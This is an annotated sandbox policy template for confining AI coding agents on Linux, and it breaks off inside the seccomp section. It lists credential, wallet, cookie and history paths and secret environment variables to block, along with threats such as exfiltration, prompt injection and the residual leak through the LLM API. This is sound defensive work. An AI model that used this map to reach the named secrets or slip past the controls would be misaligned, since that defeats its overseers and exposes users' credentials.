# Worked template: `ai-coding-strict`

**A complete, annotated policy template for confining an AI coding agent on a developer workstation.**

This document is the worked example for the `ai-coding-strict` template — the canonical case Project Kennel was designed to support. It exists for two purposes: to show what a real template looks like in practice (the policy is reproduced in full, with no hand-waving), and to explain how each policy element maps to underlying kernel primitives (so that readers can satisfy themselves that the design is implementable on commodity Linux).

The template is the most-commonly-used artefact in Project Kennel: a developer running Claude Code, Codex, Cursor, or any other AI coding agent against a single project derives their policy from this template with at most a handful of deltas. The template's job is to encode the security posture for "AI agent on one project" in a form that requires roughly 10 lines of user-authored policy to specialise.

---

## Section 1 — What this template is for

The `ai-coding-strict` template confines an AI coding agent operating against a single project tree. It assumes the user wants:

- The agent to read and write files within one project directory.
- The agent to reach a specific set of LLM API endpoints (whichever agent vendor's API the user is paying for).
- The agent to reach the user's package registries (npmjs.org, pypi.org, crates.io, ghcr.io, or whichever ones the project uses).
- The agent to use git for source control operations.
- The agent to use git-over-SSH through the re-origination bastion (§7.10), bound to specific destinations — no ssh-agent socket and no real key in the kennel.
- The agent to NOT read or modify anything else under `$HOME`.
- The agent to NOT reach local services (the user's local Postgres, dockerd, the user's other dev servers).
- The agent to NOT degrade host security configuration.
- Every action the agent attempts to be auditable.

The template is intentionally strict. The `ai-coding-permissive` variant (not shown here) loosens several of these constraints for users who accept the trade-off. Templates that diverge from `ai-coding-strict` document what they give up.

The template defends against the following threats from the catalogue (THREATS.md):

- **T1.1** (credential reconnaissance): the agent cannot enumerate or read paths outside the granted view.
- **T1.2** (malicious post-install scripts): the constrained network and exec ACL limits what `npm install` post-install scripts can do.
- **T1.3** (compromised IDE extension/MCP server): when the agent CLI is invoked inside the kennel, the IDE's compromised state cannot escalate via the agent.
- **T1.9** (supply chain): unexpected destinations are surfaced in the audit log.
- **T1.7** (DNS exfiltration): structurally prevented — the agent cannot make DNS queries directly.
- **T3.1** (setuid escalation): denied by Project Kennel invariants.
- **T1.6** (lateral movement to local services): per-kennel loopback and AF_UNIX shim deny by default.
- **T2.1** (host security control deactivation): the agent's `$HOME` is a shim; host config files are not writable.
- **T2.3** (secrets in unintended locations): `.env*` files are scrubbed from the agent's view by default.
- **T3.7** (prompt injection from project content): not prevented, but the kennel bounds the blast radius — injected instructions cannot direct the agent to read or write anything outside the granted view, or reach anywhere outside the allowlisted network.

The template explicitly does NOT defend against:

- **T1.8** (TLS-channel exfiltration via the LLM API): residual; the agent has legitimate access to the LLM API and can put exfiltrated data in API requests.
- **T2.2** (security-degrading patterns in agent-produced code): partially addressed by output review tooling, but semantic regressions are out of scope.
- **X9, X11** as documented in THREATS.md.

The user's leaf policy will typically add 2-3 deltas: the project path, the LLM API endpoint they use, optionally a corp-specific registry. Everything else is inherited.

---

## Section 2 — The policy in full

This is the actual TOML file Project Kennel consumes, with extensive comments on what each element does and which kernel primitives implement it. The file is `templates/ai-coding-strict/policy.toml` in Project Kennel repository.

```toml
# ============================================================================
# Template: ai-coding-strict
# Inherits: base-confined
# Version: 4
# Maintainer: <project signing key>
# Threat catalogue version: THREATS.md v0.3
#
# This template provides strict confinement for AI coding agents operating
# against a single project tree. User policies typically extend this with
# project paths and LLM API endpoints; everything else is inherited.
# ============================================================================

template_base = "base-confined"
template_version = "4"
template_name = "ai-coding-strict"


# ============================================================================
# 1. EXECUTION POLICY
#
# What binaries the agent may execve(). Implemented via:
#   - Landlock LANDLOCK_ACCESS_FS_EXECUTE on a path allowlist
#   - PR_SET_NO_NEW_PRIVS (Project Kennel invariant, set unconditionally)
#   - cgroup BPF on execve for additional path-resolution checks
#
# Note: this policy gates which BINARIES can run. It does not gate what
# those binaries DO once running — that is the job of the other resource
# classes below. An agent with /usr/bin/python3 in exec.allow can run any
# Python program; the filesystem and network policies constrain what that
# program can touch.
# ============================================================================

[exec]
# The interpreters and tools the agent legitimately needs. Each entry is a
# specific path, not a pattern; Project Kennel refuses glob patterns in
# allow to prevent inadvertent broad grants.
allow = [
    # System interpreters
    "/usr/bin/python3",
    "/usr/bin/python3.12",
    "/usr/bin/node",
    "/usr/bin/bash",
    "/bin/sh",
    "/usr/bin/dash",

    # Build tools
    "/usr/bin/make",
    "/usr/bin/cmake",
    "/usr/bin/gcc",
    "/usr/bin/g++",
    "/usr/bin/cc",
    "/usr/bin/ld",

    # Package managers
    "/usr/bin/npm",
    "/usr/bin/npx",
    "/usr/bin/pip",
    "/usr/bin/pip3",
    "/usr/bin/yarn",
    "/usr/bin/pnpm",

    # Source control
    "/usr/bin/git",
    "/usr/lib/git-core/**",  # git's per-subcommand helpers

    # SSH (for git-over-SSH operations)
    "/usr/bin/ssh",
    "/usr/bin/ssh-add",

    # Standard userland the agent will reach for
    "/usr/bin/cat", "/usr/bin/ls", "/usr/bin/find", "/usr/bin/grep",
    "/usr/bin/sed", "/usr/bin/awk", "/usr/bin/head", "/usr/bin/tail",
    "/usr/bin/sort", "/usr/bin/uniq", "/usr/bin/wc", "/usr/bin/cut",
    "/usr/bin/tr", "/usr/bin/diff", "/usr/bin/patch",
    "/usr/bin/mkdir", "/usr/bin/rmdir", "/usr/bin/touch",
    "/usr/bin/cp", "/usr/bin/mv", "/usr/bin/rm", "/usr/bin/ln",
    "/usr/bin/chmod", "/usr/bin/chown",
    "/usr/bin/echo", "/usr/bin/printf",
    "/usr/bin/test", "/usr/bin/[",
    "/usr/bin/which", "/usr/bin/file",
    "/usr/bin/env",  # NB: see comment in env section
    "/usr/bin/tar", "/usr/bin/gzip", "/usr/bin/gunzip",
    "/usr/bin/curl",  # NB: net policy still constrains where it can connect
    "/usr/bin/wget",  # same
]

# Categorically refused. These could appear in /usr/bin/* if a broader
# pattern were used; explicit deny is belt-and-braces. Defends against
# T3.1 (setuid escalation) and T2.1 (host security control deactivation).
#
# Implementation: Landlock denies these paths under FS_EXECUTE.
# Additionally, PR_SET_NO_NEW_PRIVS (set unconditionally as a Project Kennel
# invariant) neutralises the setuid behaviour of any setuid binary that
# might somehow be executed — belt and braces.
deny = [
    "/usr/bin/sudo",
    "/usr/bin/su",
    "/usr/bin/pkexec",
    "/usr/bin/doas",
    "/usr/bin/chsh",
    "/usr/bin/gpasswd",
    "/usr/bin/passwd",
    "/usr/bin/mount",
    "/usr/bin/umount",
    "/usr/bin/newgrp",
    "/usr/bin/at",
    "/usr/bin/crontab",          # T1.8: scheduled persistence
    "/usr/sbin/**",              # admin binaries categorically denied
    "/sbin/**",                  # ditto
]

# Categorical refusals at execve time.
# Implementation: cgroup BPF hook on bprm_check_security inspects the
# resolved binary's mode and capabilities; sets execve to fail with EACCES
# if conditions match.
deny_setuid = true               # binaries with the setuid bit refused
deny_setgid = true               # binaries with the setgid bit refused
deny_setcap = true               # binaries with file capabilities refused
deny_writable = true             # binaries in writable paths refused

# PATH inside the kennel. Set by Project Kennel spawn wrapper before execve.
# Does not affect Landlock enforcement (which is path-based on resolved
# absolute paths), but makes shell command resolution predictable.
path = ["/usr/bin", "/usr/local/bin", "/bin"]


# ============================================================================
# 2. FILESYSTEM POLICY
#
# What paths the agent can read, write, list. Implemented via:
#   - Mount namespace + bind mounts to construct the shim $HOME
#   - Landlock filesystem ACL on the constructed view
#   - tmpfs for private /tmp
#   - PID namespace for /proc visibility
#
# The constructed-view pattern is the central design move here: the agent's
# $HOME is a fresh tmpfs into which the policy-granted paths are bind-mounted.
# Credential locations are not denied on access; they simply do not exist in
# the agent's view of the filesystem.
#
# This defends against T1.1 (reconnaissance): the agent cannot enumerate paths
# that are not in the view, regardless of whether those paths exist on the
# host outside the view.
# ============================================================================

[fs]
# Read access. These paths are read-bind-mounted into the agent's view.
# The agent sees the contents but cannot modify them. Landlock denies
# any path-traversal attempt that would resolve outside this list.
read = [
    # System libraries and binaries the exec policy needs
    "/usr/**",
    "/lib/**",
    "/lib64/**",
    "/etc/ssl/**",               # TLS root CAs
    "/etc/ca-certificates/**",
    "/etc/resolv.conf",          # but DNS is shimmed — see net policy
    "/etc/hosts",                # Project Kennel writes per-kennel /etc/hosts
    "/etc/nsswitch.conf",
    "/etc/passwd",               # needed for user lookups; read-only

    # Procfs and sysfs — read-only baseline (PID namespace handles the rest)
    "/proc/self/**",
    "/proc/cpuinfo",
    "/proc/meminfo",
    "/proc/version",
    "/sys/devices/system/cpu/**", # for processor count detection
]

# Write access. These are read-write bind mounts.
# Conspicuously absent: anywhere under the user's real $HOME.
write = [
    # The project tree — added by the user's leaf policy as a delta.
    # The template does not include a project path; the user must specify.

    # Private /tmp (see fs.tmp below)
    "/tmp/**",

    # Per-kennel state directory under Project Kennel's data root
    "/run/kennel/<kennel>/state/**",
]

# Categorical denies. These paths are denied even if a user delta would
# otherwise grant them via overlap with fs.read or fs.write. Most are
# redundant with the constructed-view pattern (the paths are not bind-mounted
# in, so they simply do not exist in the agent's view); the explicit deny
# is belt-and-braces against template bugs and user policy errors.
#
# Implementation: Landlock applies these as additional negative rules
# after the positive rules above. Defends against T1.1 (reconnaissance) and
# T2.1 (host security control deactivation).
deny = [
    # ──────────────────────────────────────────────────────────────────
    # Credentials (T1.1)
    # ──────────────────────────────────────────────────────────────────
    "~/.ssh/**",
    "~/.gnupg/**",
    "~/.aws/**",
    "~/.azure/**",
    "~/.config/gcloud/**",
    "~/.oci/**",
    "~/.linode-cli/**",
    "~/.ibmcloud/**",
    "~/.config/doctl/**",
    "~/.config/gh/**",
    "~/.config/glab/**",
    "~/.config/hub",
    "~/.config/bitbucket-cli/**",
    "~/.netrc",
    "~/.npmrc",
    "~/.yarnrc",
    "~/.yarnrc.yml",
    "~/.pypirc",
    "~/.cargo/credentials",
    "~/.cargo/credentials.toml",
    "~/.docker/config.json",
    "~/.kube/config",
    "~/.terraform.d/credentials.tfrc.json",
    "~/.password-store/**",
    "~/.config/keepassxc/**",
    "~/.config/Bitwarden*/**",
    "~/.config/1Password/**",
    "~/.local/share/keyrings/**",
    "~/.gnome2/keyrings/**",

    # ──────────────────────────────────────────────────────────────────
    # Browser state and cookies (T1.1)
    # ──────────────────────────────────────────────────────────────────
    "~/.mozilla/**",
    "~/.config/google-chrome/**",
    "~/.config/chromium/**",
    "~/.config/BraveSoftware/**",
    "~/.config/microsoft-edge/**",
    "~/.config/vivaldi/**",

    # ──────────────────────────────────────────────────────────────────
    # Messaging and communication (T1.1)
    # ──────────────────────────────────────────────────────────────────
    "~/.config/Signal/**",
    "~/.config/Slack/**",
    "~/.config/discord/**",
    "~/.config/Element/**",
    "~/.thunderbird/**",
    "~/.mozilla-thunderbird/**",

    # ──────────────────────────────────────────────────────────────────
    # Shell and tool histories (T1.1)
    # ──────────────────────────────────────────────────────────────────
    "~/.bash_history",
    "~/.zsh_history",
    "~/.fish_history",
    "~/.local/share/fish/fish_history",
    "~/.python_history",
    "~/.node_repl_history",
    "~/.irb_history",
    "~/.psql_history",
    "~/.mysql_history",
    "~/.sqlite_history",
    "~/.dbshell",
    "~/.lesshst",
    "~/.viminfo",

    # ──────────────────────────────────────────────────────────────────
    # Cryptocurrency wallets (T1.1)
    # ──────────────────────────────────────────────────────────────────
    "~/.electrum/**",
    "~/.bitcoin/**",
    "~/.ethereum/**",
    "~/.config/Exodus/**",
    "~/.config/Atomic/**",

    # ──────────────────────────────────────────────────────────────────
    # VPN configuration (T1.1)
    # ──────────────────────────────────────────────────────────────────
    "~/.config/openvpn3/**",
    "~/.config/wireguard/**",
    "~/.cisco/**",
    "~/.config/forticlient/**",

    # ──────────────────────────────────────────────────────────────────
    # Host security configuration (T2.1)
    # The agent must not be able to modify these even if other rules
    # would have granted write access. Framework invariants.
    # ──────────────────────────────────────────────────────────────────
    "~/.gitconfig",              # see fs.shim below for sanitised version
    "~/.ssh/config",
    "/etc/ssh/**",
    "/etc/sudoers*",
    "/etc/passwd.bak",
    "/etc/shadow",
    "/etc/security/**",
    "/etc/pam.d/**",
    "/etc/apparmor.d/**",
    "/etc/selinux/**",

    # ──────────────────────────────────────────────────────────────────
    # System paths that are categorically not for confined contexts
    # ──────────────────────────────────────────────────────────────────
    "/proc/sys/kernel/**",
    "/sys/kernel/**",
    "/dev/mem", "/dev/kmem", "/dev/port",
    "/boot/**",
]

# Shim mode for $HOME. The agent's HOME is a tmpfs containing only the
# paths bind-mounted in by Project Kennel. This is the constructed-view
# implementation for the filesystem.
#
# Implementation:
#   1. unshare(CLONE_NEWNS) — separate mount namespace
#   2. mount("tmpfs", "/run/kennel/<kennel>/home", "tmpfs", 0700)
#   3. For each path in fs.read and fs.write that begins with ~/,
#      construct the path inside the shim and bind-mount from the real
#      location.
#   4. setenv("HOME", "/run/kennel/<kennel>/home") in the spawn
#      wrapper before execve.
#
# Defends against T1.1: the agent's view of $HOME contains only what policy
# grants. find ~ -name '.env' returns nothing if the policy did not grant
# .env files.
[fs.home]
shadow = true
shim_root = "/run/kennel/<kennel>/home"

# Sanitised dotfiles. Some configuration is needed for normal operation
# but the host versions contain sensitive content. Project Kennel
# constructs sanitised copies and bind-mounts them into the shim.
[[fs.home.sanitise]]
real = "~/.gitconfig"
shim = "~/.gitconfig"
strip = ["credential.*", "github.user", "github.token", "url.*.insteadof"]
# Defends against T1.1: gitconfig in the agent's view has no credential
# helpers, no embedded URL rewrites, no usernames. The agent sees a
# minimal gitconfig that lets git commit but reveals nothing personal.

# Private /tmp. Implementation:
#   mount("tmpfs", "/tmp", "tmpfs", MS_NOSUID|MS_NODEV, "size=512m,mode=0700")
# Defends against T1.1 (host /tmp contents invisible) and prevents the
# agent from leaving artefacts the user's other processes might read.
[fs.tmp]
private = true
size = "512M"
mode = "0700"

# Procfs handling. PID namespace makes the agent see only its own process
# tree. hidepid=2 mount option further hides /proc/<pid> directories
# from non-owners within the namespace.
#
# Implementation:
#   unshare(CLONE_NEWPID)  (in the spawn wrapper before fork)
#   mount("proc", "/proc", "proc", 0, "hidepid=2")
#
# Defends against T1.1 (the agent cannot enumerate the user's other
# processes via /proc) and T1.6 (cannot read /proc/<pid>/environ of the
# user's shell to harvest env vars).
[fs.proc]
visibility = "self"
hidepid = true

# In-project content scrubbing. Some filename patterns are categorically
# masked even within otherwise-granted write directories. Project Kennel
# overlays a tmpfs at the matching path during shim construction.
#
# Defends against T2.3 (secrets in unintended locations): the agent cannot
# read .env files in the project tree even when the project tree is
# writable. User can override per-pattern with explicit policy delta.
[fs.scrub]
patterns = [
    ".env",
    ".env.*",
    ".envrc",
    "secrets.yml",
    "secrets.yaml",
    "credentials.json",
    "service-account*.json",
    "*.pem",
    "*.key",
    "*.p12",
    "*.pfx",
    "terraform.tfstate",
    "terraform.tfstate.backup",
]
mode = "empty"   # the file appears as empty rather than as ENOENT
                 # (some build systems break on ENOENT but tolerate empty)

# Device file allowlist. Devices not in this list are not bind-mounted
# into /dev. Project Kennel constructs a minimal /dev via devtmpfs or
# explicit bind mounts.
#
# Implementation:
#   mount("tmpfs", "/dev", "tmpfs", MS_NOSUID, "mode=0755")
#   For each allowed device, bind-mount from host:
#     mount("/dev/null", "<shim>/dev/null", "", MS_BIND, "")
#
# Defends against T1.6 (cannot use /dev/kmem etc for escalation) and
# T1.1 (cannot read /dev/input/* for keylogging or /dev/video* for camera).
[fs.dev]
allow = [
    "/dev/null",
    "/dev/zero",
    "/dev/random",
    "/dev/urandom",
    "/dev/tty",
    "/dev/pts/**",
]


# ============================================================================
# 3. NETWORK POLICY
#
# All outbound traffic from the agent terminates at a kennel-local SOCKS5
# proxy. Direct connect() to any address other than the proxy is denied
# at the kernel level by cgroup BPF. The proxy enforces the per-destination
# allowlist in userspace.
#
# This is the broker pattern: kernel-level enforcement is the simple rule
# "you may only talk to your proxy", and the protocol-level filtering
# (DNS, TLS optional inspection, audit logging) lives in the proxy.
#
# Defends against:
#   - T1.1 (exfiltration to attacker.example.com): proxy denies.
#   - T1.7 (DNS exfiltration): the agent cannot make DNS queries; the
#     proxy resolves names against an allowlist.
#   - T1.6 (lateral movement to host loopback): per-kennel loopback
#     subnet means the agent's 127.0.0.1 is not the user's 127.0.0.1.
#   - T1.9 (supply-chain in allowed dep): unexpected destinations show
#     up in the audit log.
# ============================================================================

[net]
mode = "constrained"

# Per-kennel loopback addresses. Project Kennel's privileged helper adds
# these addresses to the host's loopback interface (or to a per-kennel
# dummy interface) at kennel start. The SOCKS5 proxy listens here.
#
# Implementation: the kennel's primary loopback (host offset 1 in its
# per-kennel subnet). The subnets are bit-packed, not dotted octets —
# IPv4 `127 | tag(12) | ctx(8) | host(4)` (a /28), IPv6
# `0xfd | gid(40) | ctx(16) | host(64)` (a /64). The proxy listens on
# offset 1; the workload reaches it via $KENNEL_SOCKS_PROXY (and
# `localhost`, which the synthetic /etc/hosts maps to this same primary).
#
# The address is unique per kennel; sibling contexts get different
# subnets. The user's normal shell can reach the kennel's address
# (default context has no cgroup BPF connect restrictions), but sibling
# contexts cannot reach each other.
# Both families' listeners are on by default in the proxied modes; a family is
# enabled iff its address resolves (no separate on/off flag).
# Listener addresses are computed from the kennel's tag and ctx. To override the
# host offset or port within the kennel's own subnet, set the optional
# proxy_listen_v4_address / proxy_listen_v6_address as "offset:port"
# (offset 1..=14, default "1:1080").

# cgroup BPF enforcement: deny all connect() except to the proxy.
#
# Implementation: a BPF program attached to the kennel's cgroup at
# the inet4_connect and inet6_connect hooks. The program inspects the
# destination address and port; allows iff it matches the proxy address;
# returns 0 (deny) otherwise. setsockopt(IPV6_V6ONLY, 0) is intercepted
# by a setsockopt hook and either denied or rewritten to 1, preventing
# dual-stack-socket escape paths.
#
# This is what makes the proxy unbypassable from inside the kennel:
# even if the agent constructs an arbitrary connect() syscall, the
# kernel denies it.

# DNS handling. The agent cannot do its own DNS — the cgroup BPF rules
# above deny UDP/53 and TCP/53 to anything other than the proxy. The
# proxy resolves names against the configured upstream resolver, applying
# the allowlist below.
[net.dns]
resolver = "1.1.1.1:53"          # or organisation-specific DoH endpoint
mode = "allowlist"               # only names in net.allow are resolvable
cache_ttl = "5m"
on_resolve_change = "warn"       # log re-resolution to different IP

# Outbound allow rules. The template defaults are conservative; user
# policies typically add their specific LLM API and registry.
[[net.allow]]
name = "registry.npmjs.org"
ports = [443]
protocol = "tcp"
tls.required = true
reason = "npm package registry"
threats.exposed = ["T1.9"]         # supply-chain compromise in deps is residual

[[net.allow]]
name = "pypi.org"
ports = [443]
protocol = "tcp"
tls.required = true
reason = "Python package index"
threats.exposed = ["T1.9"]

[[net.allow]]
name = "files.pythonhosted.org"
ports = [443]
protocol = "tcp"
tls.required = true
reason = "Python package files (where pypi.org redirects)"

[[net.allow]]
name = "crates.io"
ports = [443]
protocol = "tcp"
tls.required = true

[[net.allow]]
name = "static.crates.io"
ports = [443]
protocol = "tcp"
tls.required = true

[[net.allow]]
name = "github.com"
ports = [22, 443]
protocol = "tcp"
reason = "git operations over both SSH and HTTPS"
# tls.required not asserted: port 22 is SSH, not TLS

[[net.allow]]
name = "raw.githubusercontent.com"
ports = [443]
protocol = "tcp"
tls.required = true
reason = "git raw content (for installers that use it; some are fine)"

[[net.allow]]
name = "objects.githubusercontent.com"
ports = [443]
protocol = "tcp"
tls.required = true
reason = "git LFS and large-file storage"

# The user's leaf policy adds the specific LLM API:
#   [[net.allow]]
#   name = "api.anthropic.com"  -- or api.openai.com, generativelanguage.googleapis.com, etc.
#   ports = [443]
#   tls.required = true
#   reason = "AI service endpoint"
#   threats.exposed = ["T1.8"]   # in-band exfiltration via API is residual

# Categorical denies. Evaluated before allow.
#
# Implementation: the SOCKS5 proxy refuses to connect to these CIDRs
# regardless of name resolution. The cgroup BPF rules additionally deny
# any connect() attempt to these addresses even if it bypassed the
# proxy somehow.
#
# These are Project Kennel invariants — they cannot be removed by user
# policy deltas. Defends against T1.6 (cloud metadata theft, lateral
# movement to RFC1918 services).
[[net.deny.invariant]]
cidr = "169.254.169.254/32"      # AWS, GCP, Azure IPv4 metadata
reason = "cloud metadata IPv4 — never permitted from confined contexts"

[[net.deny.invariant]]
cidr = "fd00:ec2::254/128"       # AWS IPv6 metadata
reason = "AWS IPv6 metadata — never permitted"

[[net.deny.invariant]]
cidr = "fe80::/10"               # IPv6 link-local
reason = "link-local addresses — no legitimate egress destination"

[[net.deny.invariant]]
cidr = "10.0.0.0/8"
reason = "RFC1918 — internal network exfiltration"

[[net.deny.invariant]]
cidr = "172.16.0.0/12"
reason = "RFC1918"

[[net.deny.invariant]]
cidr = "192.168.0.0/16"
reason = "RFC1918"

[[net.deny.invariant]]
cidr = "100.64.0.0/10"
reason = "CGNAT range"

# Loopback handling. Per-kennel loopback subnet means the agent has
# its own 127.x.y.0/24 and IPv6 ULA /64. Host loopback (127.0.0.1) is
# not reachable unless explicitly granted via net.loopback.host_services.
#
# The template does not grant any host loopback services. User policies
# may add them with explicit reasons; the diff tool surfaces these as
# T1.6 exposures.
#
# Implementation:
#   - cgroup BPF on connect4/connect6: deny addresses outside the
#     kennel's private subnet, with exception for the proxy and any
#     explicitly granted host services.
#   - The user's loopback services on 127.0.0.1 are unreachable not
#     because of routing (loopback is routed locally) but because the
#     BPF rule denies the connect().

[net.loopback]
# The user's loopback services are not reachable. To grant a specific
# host loopback service, add a [[net.loopback.host_services]] entry
# in a user delta with a reason.
host_services = []

# Bind handling. The agent may bind to its private loopback address
# (for dev servers etc), but not to 0.0.0.0 or host loopback.
#
# Implementation:
#   - cgroup BPF on bind4: if user_ip4 == INADDR_ANY, rewrite to the
#     kennel's private_addr_v4.
#   - If user_ip4 is in the kennel's private subnet, allow.
#   - Otherwise, deny.
#
# INADDR_ANY rewriting is essential because half the JavaScript
# ecosystem (webpack, vite, etc.) defaults to binding 0.0.0.0:N.
# Denying these binds outright would break every dev server; rewriting
# transparently to the private address means the dev server works
# but is only reachable from inside the kennel's address space.
[net.bind]
inaddr_any_policy = "rewrite"
in6addr_any_policy = "rewrite"
allow_host_loopback_v4 = false
allow_host_loopback_v6 = false
families = ["v4", "v6"]
min_port = 1024                  # no privileged port binds

# IPv6 dual-stack handling. setsockopt(IPV6_V6ONLY, 0) creates a socket
# that handles both IPv4 and IPv6 traffic. If we rewrote only the IPv6
# side via the bind6 hook, the IPv4 fallback would escape isolation.
# Force IPV6_V6ONLY=1 unconditionally.
#
# Implementation: cgroup BPF on setsockopt; intercepts setsockopt
# calls with level=IPPROTO_IPV6 and optname=IPV6_V6ONLY; either denies
# or rewrites the value to 1 regardless of what the application requested.
[net.ipv6]
force_v6only = true

# Audit log.
#
# Implementation: the SOCKS5 proxy writes JSONL events to the per-kennel
# audit log directory. Events include timestamp, kennel ID, destination,
# bytes transferred, duration. Resolved-but-denied events (the agent
# tried to connect to a destination not in net.allow) are logged at a
# higher level for forensic value.
[net.audit]
log_path = "~/.local/state/kennel/<kennel>/network.jsonl"
level = "summary"


# ============================================================================
# 4. AF_UNIX SOCKET POLICY
#
# The agent's view of $HOME and $XDG_RUNTIME_DIR contains only the sockets
# the policy explicitly grants. Other sockets are not present in the
# constructed view, regardless of whether they exist on the host.
#
# Implementation:
#   - Mount namespace + bind mounts construct the shim view (see fs.home).
#   - Landlock denies AF_UNIX path access outside the shim.
#   - AppArmor (or seccomp-TRAP fallback) denies abstract-namespace
#     AF_UNIX connect() entirely.
#
# Defends against T1.6 (lateral movement to ssh-agent, gpg-agent, dbus,
# docker, etc.) and T1.1 (cannot enumerate sockets that aren't there).
# ============================================================================

[unix]
default = "deny"
abstract = "deny"                # abstract-namespace sockets denied
                                 # categorically — none of the agent's
                                 # legitimate workflows need them

# No agent socket is shimmed. git-over-SSH egress goes through the §7.10
# bastion (the [ssh] section below), which binds each synthetic key to one
# fixed destination via a forced command — the kennel never holds a real key.
# Commit signing is host-side (the human signs on review before push, §11.2).

[ssh]
[[ssh.destinations]]
dest = "git@github.com"
reason = "git-over-SSH to the project's GitHub remote, via the bastion"


# ============================================================================
# 5. D-BUS POLICY
#
# D-Bus is disabled by default for this template. The agent has no
# legitimate need for session bus or system bus access.
#
# If the user's workflow needs notifications (e.g. "build complete"),
# they can enable dbus.session.enabled and allow the Notifications
# service only. This is the smallest legitimate D-Bus grant.
#
# Implementation when enabled (§7.7): the org.projectkennel.IDBus facade on
# the binder gateway — an in-kennel facade-dbus parses the wire to typed
# messages, the operator-context host-dbus delegate filters each against the
# compiled allowlist and reconstructs the call to the real bus. No external
# proxy daemon and no bus-socket artefact in the kennel's view.
# ============================================================================

[dbus]
session.enabled = false
system.enabled = false


# ============================================================================
# 6. X11 / WAYLAND POLICY
#
# The agent has no direct display server access. Workflows that need X11
# use a different template (x11-isolated-dev) that spawns Xwayland-isolated
# or Xephyr-isolated per kennel.
#
# This template covers the common case: an AI coding agent operating
# from a terminal, with no GUI needs.
#
# Implementation: no /tmp/.X11-unix/ in the shim view, no $DISPLAY in
# the environment, no $WAYLAND_DISPLAY. The agent has no path to reach
# a display server even if it wanted to.
# ============================================================================

[x11]
xwayland_isolated = false
xephyr_isolated = false
# DISPLAY and WAYLAND_DISPLAY are stripped from env (see env.deny).


# ============================================================================
# 7. PROCESS INTROSPECTION, SIGNALS, PTRACE
#
# The agent cannot ptrace anything, cannot signal processes outside its
# kennel, and sees only its own process tree.
#
# Implementation:
#   - PID namespace (unshare(CLONE_NEWPID) in the spawn wrapper) makes
#     the user's other processes invisible.
#   - AppArmor rules deny ptrace and signal across kennel boundaries.
#   - /proc with hidepid=2 makes /proc/<pid> directories accessible
#     only to the owner of the process.
#
# Defends against T1.6 (cannot ptrace the user's shell to extract
# memory contents) and T1.1 (cannot read other processes' /proc/<pid>/
# environ for env vars).
# ============================================================================

[proc]
visibility = "self"
hidepid = true

[ptrace]
allow_targets = []               # cannot ptrace anything outside the kennel
allow_from = []                  # cannot be ptraced from outside

[signal]
allow_targets = ["self"]         # may signal own descendants only
allow_from = []                  # cannot be signalled from sibling contexts


# ============================================================================
# 8. ENVIRONMENT VARIABLES
#
# The agent inherits a curated environment, not the user's full shell env.
# Sensitive variables are stripped. Framework variables are forced.
#
# Implementation: the spawn wrapper constructs envp[] before execve from
# the rules below. Inheritance is not automatic; only listed variables
# pass through.
#
# Defends against T1.1 (cannot read OPENAI_API_KEY etc that the user has
# in their shell env) and T2.1 (the agent's $HOME points at the shim,
# not the host).
# ============================================================================

[env]
# Pass-through allowlist. Only these env vars are inherited from the
# parent shell (subject to deny below).
pass = [
    "PATH",                      # but the spawn wrapper overrides anyway
    "HOME",                      # overridden to shim location
    "USER",
    "LOGNAME",
    "LANG",
    "LC_*",
    "TERM",
    "TZ",
    "COLORTERM",
    "TMPDIR",                    # overridden to /tmp
]

# Forced values. These override anything in the inherited env.
set = {
    PATH = "/usr/bin:/usr/local/bin:/bin",
    HOME = "/run/kennel/<kennel>/home",
    TMPDIR = "/tmp",
    XDG_RUNTIME_DIR = "/run/user/<uid>",  # real path; contents shimmed
    # No SSH_AUTH_SOCK: there is no ssh-agent in the kennel. git-over-SSH goes
    # through the §7.10 bastion, configured via the synthetic ~/.ssh/config.
    # Point tools at the per-kennel proxy. `localhost` resolves (via the
    # synthetic /etc/hosts) to the kennel's primary loopback, where the proxy
    # listens; the daemon also exports the same address as $KENNEL_SOCKS_PROXY.
    HTTPS_PROXY = "socks5h://localhost:1080",
    HTTP_PROXY = "socks5h://localhost:1080",
    ALL_PROXY = "socks5h://localhost:1080",
    NO_PROXY = "",
    # The agent vendor's CLI tends to honour these for its API calls:
    # the user's leaf policy may add ANTHROPIC_API_KEY etc, but the
    # template does not — secrets injection is the user's choice.
}

# Categorical denies. Patterns matching these are dropped from the
# inherited environment even if they would have been passed through.
#
# Defends against T1.1 (credentials in env vars) and T2.1 (config leakage).
deny = [
    "SSH_AUTH_SOCK",             # no agent in the kennel; SSH egress is the bastion
    "GPG_AGENT_INFO",
    "AWS_*",
    "AZURE_*",
    "GCP_*",
    "GOOGLE_APPLICATION_CREDENTIALS",
    "OPENAI_API_KEY",
    "ANTHROPIC_API_KEY",         # user must add explicitly if needed
    "OPENROUTER_API_KEY",
    "GEMINI_API_KEY",
    "GITHUB_TOKEN",
    "GH_TOKEN",
    "GITLAB_TOKEN",
    "BITBUCKET_TOKEN",
    "NPM_TOKEN",
    "PYPI_TOKEN",
    "DOCKER_AUTH_CONFIG",
    "KUBECONFIG",
    "DATABASE_URL",
    "*_TOKEN",
    "*_SECRET",
    "*_PASSWORD",
    "*_API_KEY",
    "*_APIKEY",
    "*_PRIVATE_KEY",
    # Display server access vars — stripped because x11.* is disabled
    "DISPLAY",
    "WAYLAND_DISPLAY",
    "XAUTHORITY",
]


# ============================================================================
# 9. CAPABILITIES AND no_new_privs
#
# All capabilities dropped. PR_SET_NO_NEW_PRIVS is set unconditionally
# as a Project Kennel invariant — not overridable by any policy.
#
# Implementation:
#   prctl(PR_CAPBSET_DROP, ...) for each capability in the bounding set
#   capset() to clear permitted and effective
#   prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)
#
# Order matters: no_new_privs must be set before Landlock, before
# seccomp, before execve.
# ============================================================================

[cap]
bounding_set = []                # drop all bounding capabilities
no_new_privs = true              # Project Kennel invariant; cannot be set false


# ============================================================================
# 10. SECCOMP FILTER
#
# A defence-in-depth layer denying a small set of syscalls that have no
# legitimate use in confined AI agent contexts and have historical CVE
# involvement.
#
# Implementation: a seccomp-BPF filter installed via prctl(PR_SET_SECCOMP,
# SECCOMP_MODE_FILTER, ...) before execve. The filter returns SECCOMP_RET_ERRNO
# with EPERM for denied syscalls.
#
# Most resource-level enforcement is at higher layers (Landlock for files,
# cgroup BPF for network); seccomp here is belt-and-braces against
# specific kernel CVE classes and esoteric escape paths.
# ============================================================================

[seccomp]
profile = "default"

deny = [
    "userfaultfd",               # historical exploit chain involvement
    "perf_event_open",           # historical CVE involvement
    "bpf",                       # the agent cannot install eBPF programs
    "ptrace",                    # already denied at AppArmor layer; belt-and-braces
